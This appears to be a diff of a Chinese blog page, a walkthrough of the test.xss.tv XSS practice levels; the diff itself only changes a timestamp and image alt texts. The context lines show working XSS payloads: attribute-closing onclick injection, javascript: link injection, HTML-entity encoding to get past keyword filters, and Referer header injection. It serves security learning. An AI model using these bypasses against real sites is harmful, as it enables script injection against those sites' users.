@@ -95,7 +95,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/03/16/XSS攻击通关之路/level11_1.png">
 <meta property="og:image" content="http://yoursite.com/2019/03/16/XSS攻击通关之路/level11.png">
 <meta property="og:image" content="http://yoursite.com/2019/03/16/XSS攻击通关之路/QQ.png">
-<meta property="og:updated_time" content="2019-03-17T12:48:48.560Z">
+<meta property="og:updated_time" content="2019-03-17T13:01:36.430Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS攻击通关之路">
 <meta name="twitter:description" content="前言：&amp;emsp;&amp;emsp;之前去郑州学习的时候看了一套比较系统的XSS注入的视频，简直是要膜拜做这个视频的人，以前会的XSS注入测试跟着一比简直是关公门前耍大刀，不仅刷新了以前对这个注入的理解，还涨了不少姿势。看来以后这种学习大会一定要多去去见识见识，没有什么比这提升更快了我觉得。。。。。。 正文：&amp;emsp;&amp;emsp;刚开始还是先在这里记录一下XSS注入的意义和危害吧： &amp;emsp;&amp;em">
@@ -396,7 +396,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">	&lt;input name=keyword  value=&apos;&apos;&amp;gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&apos;&gt;</span><br><span class="line">	&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;可以看出输入的<code>&quot;</code>、<code>&lt;</code>和<code>&gt;</code>都被过滤了，所以带有尖括号的ShellCode就不能用了。所以在此换思路采用事件属性：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.xss.tv/level3.php?keyword=&apos;+onclick=&apos;javascript:Aalert(/xss/)&apos;&amp;submit=submit</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;同样的道理，先闭合前一个变量值，在放ShellCode，放到界面输入框就是<img src="/2019/03/16/XSS攻击通关之路/level3_real.png" alt="level3测试"></p>
+<p>&emsp;&emsp;同样的道理，先闭合前一个变量值，在放ShellCode，放到界面输入框就是<img src="/2019/03/16/XSS攻击通关之路/level3_real.png" alt="level4"></p>
 <p>&emsp;&emsp;在这里就要注意下，因为上面用的是<code>onclick</code>点击事件，所以还要点击一下输入框才会有弹窗。</p>
 </li>
 <li><p>第四种就是过滤关键字：</p>
@@ -406,7 +406,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=level5.php method=GET&gt;</span><br><span class="line">	&lt;input name=keyword  value=&quot;&quot; o_nclick=&quot;javascript:alert(/xss/)&quot;&gt;</span><br><span class="line">	&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;很明显，<code>onclick</code>关键字中间被加了下划线，这种是用双关键字和大小写绕过不了的，那就换一种触发事件，这里可以先考虑超链接</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.xss.tv/level5.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;点这里&lt;/a&gt;//</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;看到的结果就是<img src="/2019/03/16/XSS攻击通关之路/level5.png" alt="level3测试"></p>
+<p>&emsp;&emsp;看到的结果就是<img src="/2019/03/16/XSS攻击通关之路/level5.png" alt="level5"></p>
 <p>&emsp;&emsp;同样可以成功，后面加了个<code>//</code>的原因是为了注释掉后面多余的部分，以免影响代码的正确性。同样的道理，这一类型的常用利用方法有<code>onclick,onerror,</code>、<code>&lt;a&gt;标签、&lt;img&gt;标签、&lt;svg&gt;标签</code>、<code>双关键字、大小写</code>等不同的多种组合。</p>
 </li>
 <li><p>第五种就是HTML实体编码绕过</p>
@@ -416,7 +416,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=level8.php method=GET&gt;</span><br><span class="line">	&lt;input name=keyword  value=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">	&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">	&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;</span><br><span class="line">	&lt;img src=level8.jpg&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;这个时候HTML实体编码就可以派上用场了：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.xss.tv/level8.php?keyword=javascrip&amp;#x74;:alert(/xss/)&amp;submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;这里的submit参数后面的一串URL编码代表的是添加友情链接，界面执行就是<img src="/2019/03/16/XSS攻击通关之路/level8.png" alt="level3测试"></p>
+<p>&emsp;&emsp;这里的submit参数后面的一串URL编码代表的是添加友情链接，界面执行就是<img src="/2019/03/16/XSS攻击通关之路/level8.png" alt="level6"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=level8.php method=GET&gt;</span><br><span class="line">	&lt;input name=keyword  value=&quot;javascrip&amp;amp;#x74;:alert(/xss/)&quot;&gt;</span><br><span class="line">	&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">    &lt;a href=&quot;javascrip&amp;#x74;:alert(/xss/)&quot;&gt;友情链接&lt;/a&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">    &lt;img src=level8.jpg&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;同样的道理，这里需要点击那个友情链接。可以看出，源码不会出现问题，这里的<code>t</code>使用HTML实体编码照样能够被解析成功。这就是HTML实体编码的强大之处，HTML可以识别，执行文件的正则匹配不会成功，从而达到一个绕过的效果。</p>
 <p>&emsp;&emsp;编码绕过的方式还有好多种，比如<code>十六进制编码</code>、<code>jsfuck编码</code>、<code>url编码</code>等，这里不做过多的举例。</p>
@@ -424,12 +424,12 @@
 <li><p>第六种就是HTTP头流量包注入：</p>
 <p>&emsp;&emsp;这种就是在隐藏HTTP流量存在CSS漏洞的时候就可以抓包修改，流通ShellCode：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">	&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">	&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">	&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">	&lt;input name=&quot;t_ref&quot;  value=&quot;http://test.xss.tv/level10.php?keyword=well%20done!&amp;t_sort=%22type=%22text%22%20onclick%20=%20%22alert(1)&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;可以看出，第四个隐藏的<code>&lt;input&gt;</code>标签里面流通的是<code>t_ref</code>，可以猜测，这个流量包是经过<code>Referer</code>的，所以对其进行抓包，修改Referer参数<img src="/2019/03/16/XSS攻击通关之路/level11_1.png" alt="level3测试"><img src="/2019/03/16/XSS攻击通关之路/level11.png" alt="level3测试"></p>
+<p>&emsp;&emsp;可以看出，第四个隐藏的<code>&lt;input&gt;</code>标签里面流通的是<code>t_ref</code>，可以猜测，这个流量包是经过<code>Referer</code>的，所以对其进行抓包，修改Referer参数<img src="/2019/03/16/XSS攻击通关之路/level11_1.png" alt="level7"><img src="/2019/03/16/XSS攻击通关之路/level11.png" alt="level8"></p>
 <p>&emsp;&emsp;可以看到，这里多出来了一个部分，因为使用的是<code>onmouseover</code>事件，所以只要鼠标经过触碰到，就会触发通过。同样的道理，还可以修改<code>User-Agent</code>、<code>Cookie</code>等一系列HTTP头参数，具体情况具体使用。</p>
 </li>
 </ol>
 <p>&emsp;&emsp;这里一直可以做到第十三关，第十四关好像崩了，进行不下去了。这样这次就做到这里了，以后找机会再往后进行吧，这一次消化的东西有点多了。如果记录的有什么不对，还请表哥表姐们点名批评，批评通道：</p>
-<p><img src="/2019/03/16/XSS攻击通关之路/QQ.png" alt="level3测试"></p>
+<p><img src="/2019/03/16/XSS攻击通关之路/QQ.png" alt="level9"></p>
 
       
     </div>
